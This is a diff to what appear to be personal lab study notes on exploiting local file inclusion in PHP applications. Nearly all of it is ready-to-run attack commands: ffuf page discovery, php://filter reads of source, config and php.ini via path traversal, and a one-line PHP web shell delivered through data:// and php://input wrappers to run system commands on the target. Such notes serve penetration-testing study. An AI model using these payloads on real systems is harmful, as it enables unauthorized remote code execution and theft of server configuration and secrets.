@@ -16,9 +16,31 @@ cut .php over 4096 at the end:
 Fuff / Gobuster:
   brute .php
 
+  ffuf -s -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://STMIP:STMPO/FUZZ.php
+      -s      silent
+
 
 Read php raw code：
-  php://filter/read=convert.base64-encode/resource=config      in url
+  http://STMIP:STMPO/index.php?language=php://filter/read=convert.base64-encode/resource=configure
+  echo -n 'hash' | base64 -d
+      -n      no \n
+      -d      decode
+
+Check php.ini:
+  我们可以包含位于 (/etc/php/X.Y/apache2/php.ini) (适用于 Apache) 或 (/etc/php/X.Y/fpm/php.ini) (适用于 Nginx) 的 PHP 配置文件，其中 X.Y 是你安装的 PHP 版本
+  curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
+  echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
+    allow_url_include      need to be ON
+
+  echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
+    extension=expect
 
 
-  
+base64 encode WebSHELL:
+  echo '<?php system($_GET["cmd"]); ?>' | base64
+
+run cmd in url:
+  curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,BASE64WebSHELL&cmd=id' 
+    -s silent
+  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
+  curl -s -X POST --data '<?php system("id"); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input" | grep uid
